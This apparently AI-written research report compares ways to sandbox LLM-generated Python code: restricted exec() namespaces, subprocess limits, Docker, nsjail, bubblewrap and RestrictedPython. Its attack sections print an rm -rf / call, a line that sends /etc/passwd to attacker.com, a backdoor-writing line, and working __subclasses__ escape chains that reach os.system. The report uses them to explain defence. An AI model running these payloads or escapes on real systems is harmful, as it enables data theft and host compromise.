> **Recovery note**: Research report recovered verbatim from a lost session's log (`researcher-exec.txt`). Research for task P2.5.5 (Python code execution sandboxing) was completed in that session; this document preserves the full sourced report.

                   Research Results: Python Code Execution Sandboxing for LLM-Generated Code
1. Security Risks of exec() with Untrusted Code
The Core Problem
Python's exec() executes arbitrary Python statements — including imports, function definitions, class
definitions, and multi-line programs. When fed LLM-generated code, it runs with the same privileges as the host
process.
Attack Vectors
Direct system access:

 import os; os.system("rm -rf /")
 import subprocess; subprocess.call(["cat", "/etc/passwd"])
 open("/etc/passwd").read()

Data exfiltration:

 import urllib.request
 urllib.request.urlopen("http://attacker.com?data=" + open("/etc/passwd").read())

Persistence:

 # Write a backdoor to disk
 open("/tmp/backdoor.py", "w").write("import os; os.system('...')")

Application state corruption:

 # Redefine security functions
 __builtins__["print"] = lambda *a: None  # suppress output

Key finding: Security researchers are unanimous — there is no safe way to sandbox exec() using restricted
namespace dictionaries. Python's introspection capabilities (__subclasses__(), __mro__, __builtins__) have been
used to escape all known namespace-based sandboxes.
 • Source: Code Pathfinder
 • Source: Safeguard Research
 • Source: Real Python exec() tutorial
---------------------------------------------------------------------------------------------------------------
2. Restricted Globals/Locals: Why It Fails
The Approach

 restricted = {"__builtins__": {}}
 exec(code, restricted)

This removes access to built-in functions. You can also whitelist specific builtins:

 allowed = {"__builtins__": {"min": min, "print": print, "range": range}}
 exec(code, allowed)

Known Bypasses
The __subclasses__ escape — walks Python's object hierarchy to find dangerous classes:

 # Works even with __builtins__ = {}
 ().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].system('whoami')

The index (104) varies by Python version, but the technique works universally. There are dozens of variations.
Stack frame escape — generators can access stack frames:

 def escape():
     frame = (lambda: None).__code__.co_filename
     # Walk the frame chain to reach unrestricted code
     import types
     g = ().__class__.__base__.__subclasses__()
     for cls in g:
         if hasattr(cls, '__init__'):
             if 'sys' in cls.__init__.__globals__:
                 cls.__init__.__globals__['sys'].modules['os'].system('id')

String obfuscation bypasses (from Artem Golubin's research):

 # Bypasses simple keyword detection
 getattr(globals()["__bu"+"ilt"+"ins__"], "".join(reversed(["al","ev"])))("2+2")

Key conclusion: Namespace restrictions provide weak security. Every SAST tool (Sourcery, GuardRails, Vulnetix,
Code Pathfinder) flags all exec() calls regardless of namespace restrictions, because the restrictions are
consistently bypassable.
---------------------------------------------------------------------------------------------------------------
3. Established Approaches for Python Code Sandboxing
3a. exec() with Restricted Globals (NOT recommended for untrusted code)
Pros: Simple, no external dependencies Cons: Fundamentally bypassable via object introspection Verdict: Only
appropriate for trusted, developer-controlled code
3b. Subprocess with Isolation (RECOMMENDED baseline)
Run code in a separate process with:
 • subprocess.Popen with preexec_fn for resource limits
 • signal.SIGALRM or subprocess.communicate(timeout=) for time limits
 • resource.setrlimit for CPU, memory, file descriptors
 • Stripped environment variables

 import subprocess, resource, sys, tempfile, os

 def _set_limits(cpu_seconds=5, mem_mb=256):
     resource.setrlimit(resource.RLIMIT_CPU, (cpu_seconds, cpu_seconds))
     resource.setrlimit(resource.RLIMIT_AS, (mem_mb * 1024 * 1024, mem_mb * 1024 * 1024))
     resource.setrlimit(resource.RLIMIT_NOFILE, (32, 32))

 def run_code_safely(code: str, timeout: float = 10.0) -> dict:
     with tempfile.NamedTemporaryFile(mode="w", suffix=".py", delete=False) as f:
         f.write(code)
         script_path = f.name
     try:
         proc = subprocess.Popen(
             [sys.executable, script_path],
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE,
             env={"PATH": os.environ.get("PATH", ""), "HOME": "/tmp"},
             preexec_fn=_set_limits,
         )
         try:
             out, err = proc.communicate(timeout=timeout)
             return {"exit_code": proc.returncode, "stdout": out.decode(), "stderr": err.decode()}
         except subprocess.TimeoutExpired:
             proc.kill()
             out, err = proc.communicate()
             return {"exit_code": -1, "stdout": out.decode(), "stderr": "timeout", "timed_out": True}
     finally:
         os.unlink(script_path)

Pros: Process isolation (crash doesn't take down host), OS-enforced limits Cons: No filesystem isolation, no
network isolation, macOS RLIMIT_AS is unreliable

 • Source: Python subprocess docs
 • Source: agentry sandbox tutorial
3c. Container-Based Isolation (Gold standard)
Docker — used by SWE-bench for evaluating LLM-generated patches:

 docker run --rm --network none --memory 512m --cpus 1 \
   -v "$PWD":/work -w /work python:3.12-alpine \
   python script.py

SWE-bench applies model-generated patches to real repositories inside Docker containers, then runs the repo's
test suite. This is the production-grade approach for LLM code evaluation.
 • Source: SWE-bench evaluation guide
 • Source: SWE-bench repo
nsjail — Google's lightweight process isolation tool:

 nsjail -Mo --chroot / --user 99999 --group 99999 \
   --time_limit 10 --rlimit_as 256 --rlimit_cpu 5 \
   --seccomp_string 'ALLOW { read, write, exit, exit_group } DEFAULT KILL' \
   -- python3 script.py

Features: namespace isolation (PID, mount, net, user, IPC, UTS), seccomp-bpf syscall filtering, cgroup resource
control, filesystem constraints.
 • Source: google/nsjail
 • Source: python-nsjail — pip-installable prebuilt binary
bubblewrap (bwrap) — Flatpak's sandbox, unprivileged:

 bwrap --ro-bind /usr /usr --ro-bind /lib /lib \
   --tmpfs /tmp --unshare-all --die-with-parent \
   -- python3 script.py

 • Source: containers/bubblewrap
 • Source: sandbox-venv — virtualenv wrapper using bwrap
3d. Resource Limits via resource Module

 import resource, signal, platform

 def reliability_guard(maximum_memory_bytes=None):
     if maximum_memory_bytes and platform.uname().system != "Darwin":
         resource.setrlimit(resource.RLIMIT_AS, (maximum_memory_bytes, maximum_memory_bytes))
         resource.setrlimit(resource.RLIMIT_DATA, (maximum_memory_bytes, maximum_memory_bytes))
         resource.setrlimit(resource.RLIMIT_STACK, (maximum_memory_bytes, maximum_memory_bytes))

     # Disable destructive OS functions
     import os, shutil, subprocess, builtins
     os.system = None
     os.remove = None
     os.rmdir = None
     shutil.rmtree = None
     subprocess.Popen = None
     builtins.exit = None
     builtins.quit = None

Note: macOS RLIMIT_AS aliases the unenforced RLIMIT_RSS — memory limits don't work properly on macOS.

 • Source: HumanEval execution.py
---------------------------------------------------------------------------------------------------------------
4. RestrictedPython Library
How It Works
RestrictedPython rewrites Python AST to route sensitive operations through guard hooks that the embedding
application supplies:
 • Attribute access → _getattr_(obj, name)
 • Item access → _getitem_(obj, key)
 • Writes → _write_(obj, key, value)
 • Print → _print_(*args)
It also:
 • Blocks access to names starting with underscore (prevents __class__, __subclasses__ escapes)
 • Blocks star imports (from x import *)
 • Removes __import__ by default (import must be explicitly allowed)
 • Provides safe_builtins and safe_globals dictionaries

 from RestrictedPython import compile_restricted, safe_globals

 source_code = "import os\nos.listdir('/')"
 byte_code = compile_restricted(source_code, '<string>', 'exec')
 exec(byte_code, safe_globals, {})
 # ImportError: __import__ not found

Maintenance Status
Actively maintained by the Zope Foundation. Current version: 8.5 (August 2026). Supports Python 3.10-3.15.
~14.6M monthly downloads on PyPI.
 • Source: RestrictedPython on PyPI
 • Source: RestrictedPython GitHub
CVE History (Limitations Exposed)
RestrictedPython has had multiple sandbox escape CVEs, demonstrating that in-process Python sandboxing is
fundamentally fragile:

 CVE                  Year  Description
 ───────────────────────────────────────────────────────────────────────────────────────
 CVE-2023-37271       2023  Access to restricted Python internals
 CVE-2023-41039       2023  Sandbox escape via str.format() and string.Formatter
 GHSA-wqc8-x2pr-7jqh  2023  Stack frame sandbox escape via generators
 CVE-2024-47532       2024  Information leakage via AttributeError.obj and string module
 CVE-2025-22153       2025  Sandbox escape via try/except* (ExceptionGroup)
 GHSA-ffg3-p8fm-mjx2  2026  Guard hooks shadowed via positional-only arguments

Key limitation: RestrictedPython is explicitly not a sandbox — it's a tool for building a restricted execution
environment. The embedding application must still supply proper guard hooks and use it correctly.
---------------------------------------------------------------------------------------------------------------
5. What LLM Evaluation Frameworks Actually Do
HumanEval (OpenAI)
Approach: subprocess + exec() with reliability_guard
HumanEval runs model-generated code in a separate process (multiprocessing.Process), then inside that process
uses exec() with:
 1 A reliability_guard() that nullifies destructive functions (os.system, os.remove, shutil.rmtree,
   subprocess.Popen, etc.)
 2 Resource limits via resource.setrlimit (memory, when specified)
 3 A time_limit context manager using signal.SIGALRM
 4 I/O swallowing (stdout/stderr/stdin redirected to WriteOnlyStringIO)
 5 A temporary directory (tempfile.TemporaryDirectory) as the working directory
The code explicitly warns: "This function is NOT a security sandbox. Untrusted code, including model-generated
code, should not be blindly executed outside of one."

 # HumanEval's actual execution pattern
 def unsafe_execute(problem, completion, timeout, result):
     with create_tempdir():
         reliability_guard()
         check_program = problem["prompt"] + completion + "\n" + problem["test"] +
 f"\ncheck({problem['entry_point']})"
         exec_globals = {}
         with swallow_io():
             with time_limit(timeout):
                 exec(check_program, exec_globals)
         result.append("passed")

 • Source: HumanEval execution.py
SWE-bench (Princeton NLP)
Approach: Docker containers
SWE-bench applies model-generated patches to real repositories inside Docker containers, then runs the repo's
own test suite. They explicitly moved to fully containerized evaluation (June 2024) with Docker for
reproducibility and isolation.

 swebench eval verified -p <predictions> --run-id <run_id> -j <num_workers>

Each instance gets its own Docker container with the appropriate repo environment.
 • Source: SWE-bench evaluation guide
ollama-codeeval
Approach: Docker sandbox
Uses Docker-sandboxed code execution for evaluating Ollama models against HumanEval. Builds a python-sandbox
Docker image specifically for safe execution.
 • Source: rhiza-fr/ollama-codeeval
Emerging Libraries
pyplaypen-sandbox — subprocess sandbox with POSIX rlimits, UID drop, Landlock filesystem confinement:

 from pyplaypen_sandbox import Sandbox, Context, Limits
 sandbox = Sandbox(max_concurrency=4)
 result = await sandbox.execute(code, Context(), Limits(wall_seconds=10))

sandtrap — AST rewriting + optional kernel isolation (seccomp/Landlock/Seatbelt):

 from sandtrap import Policy, sandbox
 with sandbox(Policy(timeout=5.0), isolation="kernel") as sb:
     result = sb.exec("print('hello')")

py-sandbox — AST validation + restricted builtins + subprocess + resource limits:

 from py_sandbox import execute
 result = execute("import math; print(math.sqrt(16))")

---------------------------------------------------------------------------------------------------------------
6. Practical Recommendations for a Local Development Tool
Threat Model Assessment
For yoker-test (local dev tool, single user, runs on developer's machine):
 • The code comes from LLMs you're evaluating — not from adversarial users
 • The primary risk is accidental damage (LLM generates buggy/destructive code), not malicious attacks
 • The developer running the tool already has full system access
 • The blast radius is the developer's own machine
Recommended Approach: Subprocess + Resource Limits (HumanEval-style)
For a local development tool, the HumanEval pattern hits the right balance:

 import contextlib
 import faulthandler
 import multiprocessing
 import os
 import signal
 import tempfile
 import resource
 import platform

 class TimeoutException(Exception):
     pass

 @contextlib.contextmanager
 def time_limit(seconds: float):
     def signal_handler(signum, frame):
         raise TimeoutException("Timed out!")
     signal.setitimer(signal.ITIMER_REAL, seconds)
     signal.signal(signal.SIGALRM, signal_handler)
     try:
         yield
     finally:
         signal.setitimer(signal.ITIMER_REAL, 0)

 def reliability_guard(maximum_memory_bytes=None):
     """Disable destructive functions. NOT a security sandbox."""
     if maximum_memory_bytes is not None:
         import resource
         resource.setrlimit(resource.RLIMIT_AS, (maximum_memory_bytes, maximum_memory_bytes))
         resource.setrlimit(resource.RLIMIT_DATA, (maximum_memory_bytes, maximum_memory_bytes))
         if platform.uname().system != "Darwin":
             resource.setrlimit(resource.RLIMIT_STACK, (maximum_memory_bytes, maximum_memory_bytes))

     faulthandler.disable()

     import builtins, os, shutil, subprocess
     builtins.exit = None
     builtins.quit = None
     os.kill = None
     os.system = None
     os.remove = None
     os.removedirs = None
     os.rmdir = None
     shutil.rmtree = None
     shutil.move = None
     subprocess.Popen = None  # type: ignore

 def execute_code(code: str, timeout: float = 10.0, memory_mb: int = 512) -> dict:
     """Execute LLM-generated code in an isolated subprocess."""
     manager = multiprocessing.Manager()
     result = manager.list()

     def worker():
         with tempfile.TemporaryDirectory():
             reliability_guard(maximum_memory_bytes=memory_mb * 1024 * 1024)
             try:
                 exec_globals = {}
                 exec(code, exec_globals)
                 result.append("passed")
             except TimeoutException:
                 result.append("timed out")
             except BaseException as e:
                 result.append(f"failed: {e}")

     p = multiprocessing.Process(target=worker)
     p.start()
     p.join(timeout=timeout + 1)
     if p.is_alive():
         p.kill()
     if not result:
         result.append("timed out")

     return {"result": result[0]}

Why This Approach

                       Subprocess +
 Criterion             reliability_guard        Docker                nsjail                  RestrictedPython
 ─────────────────────────────────────────────────────────────────────────────────────────────────────────────
 Simplicity            ✅ Stdlib only           ❌ Docker dependency  ❌ Linux only, build    ✅ pip install
                                                                      needed
 macOS support         ✅ Full                  ✅ Docker Desktop     ❌ Linux only           ✅ Full
 Process isolation     ✅ Separate process      ✅ Container          ✅ Namespace            ❌ In-process
 Resource limits       ✅ rlimits               ✅ cgroups            ✅ rlimits + cgroups    ❌ None
 Filesystem isolation  ❌ No                    ✅ Full               ✅ Full                 ❌ No
 Network isolation     ❌ No                    ✅ --network none     ✅ Net namespace        ❌ No
 Escape resistance     ⚠️ Moderate              ✅ Strong             ✅ Strong               ⚠️ CVE history

Upgrade Path
 1 Phase 1 (now): Subprocess + reliability_guard + timeout — matches HumanEval, stdlib only, works everywhere
 2 Phase 2 (if needed): Add resource.setrlimit for CPU/memory limits in the subprocess preexec_fn
 3 Phase 3 (if evaluating untrusted/adversarial code): Move to Docker containers with --network none — matches
   SWE-bench's approach
Key Principles
 1 Never use bare exec() in the main process — always spawn a subprocess
 2 Always set a timeout — LLM code can hang (infinite loops, network calls)
 3 Always strip environment variables — prevent API key leakage
 4 Use a temporary directory — isolate file writes
 5 Document clearly that it's not a security sandbox — HumanEval does this explicitly
 6 For a local tool, simplicity > perfect isolation — the developer running it already has full access
---------------------------------------------------------------------------------------------------------------
Sources
 • Code Pathfinder - exec() security
 • Safeguard - Python code injection
 • Real Python - exec() tutorial
 • Artem Golubin - Tracking malicious code execution
 • HumanEval execution.py
 • HumanEval README
 • SWE-bench evaluation guide
 • SWE-bench repository
 • RestrictedPython on PyPI (v8.5)
 • RestrictedPython GitHub
 • RestrictedPython CVE-2024-47532
 • RestrictedPython guard shadowing advisory
 • RestrictedPython stack frame escape
 • RestrictedPython format escape CVE
 • google/nsjail
 • python-nsjail
 • pyplaypen-sandbox
 • sandtrap
 • py-sandbox (LostSyscall)
 • sandbox-venv (bubblewrap wrapper)
 • ollama-codeeval
 • Python subprocess docs
 • Sourcery - exec() vulnerability
 • Vulnetix - eval/exec usage